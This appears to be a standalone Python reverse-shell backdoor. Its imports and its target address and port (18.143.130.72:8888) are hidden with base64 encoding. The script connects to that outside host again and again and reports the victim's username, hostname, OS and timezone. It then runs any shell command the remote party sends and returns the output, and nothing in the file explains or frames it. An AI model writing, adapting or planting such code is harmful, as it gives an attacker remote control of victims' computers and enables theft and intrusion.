import base64
import getpass
import platform


# Dynamic imports using exec() to obfuscate module usage
exec(base64.b64decode('aW1wb3J0IHNvY2tldA==').decode('utf-8'))
exec(base64.b64decode('aW1wb3J0IHN1YnByb2Nlc3M=').decode('utf-8'))
exec(base64.b64decode('aW1wb3J0IHRpbWU=').decode('utf-8'))
exec(base64.b64decode('aW1wb3J0IGdldHBhc3M=').decode('utf-8'))
exec(base64.b64decode('aW1wb3J0IHBsYXRmb3Jt').decode('utf-8'))
exec(base64.b64decode('ZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWU=').decode('utf-8'))

# Obfuscated constants
H, P = base64.b64decode('MTguMTQzLjEzMC43Mg==').decode('utf-8'), int(base64.b64decode('ODg4OA==').decode('utf-8'))

def c_s():
    while True:
        try:
            s = getattr(__import__('socket'), 'socket')()
            s.connect((H, P))
            return s
        except getattr(__import__('socket'), 'error') as err:
            print(f"Error: {err}")
            time.sleep(10)

def g_b():
    u = getpass.getuser()
    h = socket.gethostname()
    o = f"{platform.platform()}_{platform.win32_edition()}"
    ct = datetime.now().strftime("%d%m%y_%H%M")
    tz = time.timezone if (time.localtime().tm_isdst == 0) else time.altzone
    tz = -tz // 3600
    b = f"{u} {h} {o} {ct}_GMT{tz:+03}"
    return base64.b64encode(b.encode()).decode('utf-8')

def r_s(s):
    try:
        b = base64.b64decode(g_b().encode('utf-8'))
        s.send(b)
        while True:
            cmd = s.recv(1024).decode('utf-8')
            if cmd.lower() == 'exit':
                break
            out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s_val = out.stdout.read() + out.stderr.read()
            s.send(s_val or base64.b64encode('Executed\n'.encode('utf-8')))
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

if __name__ == '__main__':
    while True:
        c = c_s()
        r_s(c)
        time.sleep(10)
